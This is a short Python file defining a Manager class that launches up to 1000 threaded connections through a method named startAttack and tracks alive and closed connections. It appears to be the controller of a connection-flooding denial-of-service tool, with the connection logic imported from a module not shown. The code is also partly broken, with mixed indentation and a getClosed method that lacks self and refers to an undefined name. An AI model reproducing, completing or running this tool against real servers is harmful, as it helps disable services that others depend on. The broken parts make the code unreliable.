from connection import *
from counter import *

import time
class Manager:
  connection=""
  threads=1000
  timebetweenconnection=1
  counter= Counter()
  def __init__(self):
    threading.stack_size(756*1024)  
  def setThreads(self,threads):
    self.threads=threads
  def newConnection(self, options):
	  con=Connection()
	  con.setOptions(options)
	  con.start()
  def setConnection(self,connection):
    self.connection=connection
  def getClosed():
	  return counter.getClosed()
  def startAttack(self):
	for i in range(self.threads):
		con=Connection()
		con.setOptions(self.connection.getOptions())
		con.start()	
  def getStatus(self):
	  return "Alive Connections: "+str(self.counter.getConnected()) +"\nClosed_connections: "+str(self.counter.getClosed())
